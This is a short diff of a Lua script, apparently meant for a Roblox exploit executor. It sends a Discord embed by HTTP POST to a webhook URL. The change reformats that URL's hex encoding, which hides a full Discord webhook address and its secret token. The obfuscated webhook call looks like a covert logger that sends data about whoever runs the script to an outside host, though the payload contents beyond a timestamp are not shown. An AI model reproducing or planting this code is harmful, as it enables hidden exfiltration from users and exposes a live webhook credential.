@@ -622,7 +622,7 @@ local Embed = {
 			["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
 };
 (syn and syn.request or http_request or http.request) {
-    Url = '68 74 74 70 73 3a 2f 2f 64 69 73 63 6f 72 64 2e 63 6f 6d 2f 61 70 69 2f 77 65 62 68 6f 6f 6b 73 2f 31 30 36 30 33 35 38 34 33 33 34 33 35 35 36 32 30 38 35 2f 69 70 54 66 52 5f 62 4c 45 5a 57 55 59 46 49 64 49 6e 6a 6f 54 57 5a 76 48 73 5f 44 55 6f 35 4e 54 35 7a 6b 70 52 38 79 41 6c 36 61 64 4e 32 45 38 5f 78 4f 37 55 62 4a 58 66 4d 4e 2d 4f 49 4c 6f 42 6c 68';
+    Url = '68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313036303335383433333433353536323038352f69705466525f624c455a575559464964496e6a6f54575a7648735f44556f354e54357a6b70523879416c3661644e3245385f784f3755624a58664d4e2d4f494c6f426c68';
     Method = 'POST';
     Headers = {
         ['Content-Type'] = 'application/json';
